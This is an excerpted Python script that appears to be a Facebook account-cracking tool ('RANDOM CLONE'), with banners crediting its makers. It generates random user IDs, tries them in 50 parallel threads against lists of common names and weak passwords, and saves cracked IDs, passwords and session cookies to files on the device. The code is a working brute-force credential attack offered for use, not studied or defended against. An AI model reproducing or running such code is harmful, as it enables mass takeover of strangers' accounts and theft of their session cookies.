...
os.system("xdg-open https://www.facebook.com/cro.cro.395669")
...
\033[1;97m═══════════════════════════════════════════════
[\033[1;92m=\033[1;97m]FACEBOOK       \033[1;91m: \033[1;97AKASH-EVAN
[\033[1;92m=\033[1;97m]TOOL           \033[1;91m: \033[1;97mRANDOM CLONE
[\033[1;92m=\033[1;97m]NETWORK        \033[1;31m: \033[1;97m3G\033[97;1m,4G,5G
[\033[1;92m=\033[1;97m]VERSION        \033[1;91m: \033[38;5;208m0.5
\033[1;97m═══════════════════════════════════════════════
"""  )
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+'firstslast')
					pwv.append(frs+'first123')
					pwv.append(frs+'sadiya')
					pwv.append(frs+'Sadiya123')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [TAKBIR-M1] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mAKASH-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+TAKBIR-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mTAKBIR-M1\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/TAKBIR-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
   ...
   # name=input("\033[1;92mUSER NAME : \033[1;92m")
    ...
    with ThreadPool(max_workers=50) as ALAMIN:
        ...
        print(f"\033[1;92m[\033[1;32m=\033[1;92m]\033[0;92m AMOUNT         \033[1;34m: \033[0;92m"+tl+" ")
        ...
        print(f"\033[1;92m---------------------------------------------------------")
        for love in user:
            pwv = [love,love[2:],love[1:],code+love,code+love[:3],"sadiya","102030","708090","203040","taniya","mababa","jannat","bristy","alamin","sabbir","shakib","farjana","sultana","afsana"," afredi","jannati","shikha","shakila","nupur123","fatema","nabila","trisha","akashi","meghla","farjana","konika","moniya","muskan","nusrat","taybul","shohan","furkan","kawsar","nilima","forida","anjoli","rupsha","shobuj","nil123","kobita","eva123", "halima"," nilima","jesmin","kajoli","Alamin","Jannat","Alomgir","alomgir","takbir","Takbir","marufa","i love you","bangladesh","Bangladesh","humaiyon","hafizur","saiful","yeasin","sahinur","sabbir","mubarok","allahu","mahedi","shakib","salman","mim123","mariya","ripon123","jinnat","zinnat","sajahol","arafat","monika","kuddus","komola","mistar","farjilat","museda","sabana","sabnur","sohagi","nusrat","mursed","lamiya","hannan","khalek","সাদিয়া","জান্নাতি","জান্নাত","সুমাইয়া","বিল্লাল","billal","nishat","bithi123","kamrul","Kamrul"]
            uid = code+love
...
def rcerek(uid,pwx,tl):
    ...
    # 'cookie': 'datr=E5LUZFwINDQX1TseM8QIsUKJ; sb=E5LUZMYSH2dQrNzbnHWpHe0l',
    'dpr': '2',
    ...
    'user-agent':pro}
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mTAKBIR-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[TAKBIR.CP]\033[1;93m[=]\033[1;91m'+uid+' | '+ps+'\033[1;94m'+tahunng(uid))
              #  print ('\033[1;32m[‎😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/TAKBIR-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[AKASH-M1]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def alamin(uid,pwv,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mTAKBIR-OK\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    #print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')              
        	    cek_apk(session,coki)
        	    open('/sdcard/TAKBIR-RANDOM.OK.txt', 'a').write( ids+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
            elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	  #  print('\033[1;32m[TAKBIR-CP]\033[1;32m[=]\033[1;92m'+uid+' | '+ps+'\033[1;91m '+tahunng(uid))
              #  print ('\033[1;32m[😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/TAKBIR-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    ...
        	    continue
        loop+=1
        sys.stdout.write('\r%s[TAKBIR-M2]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
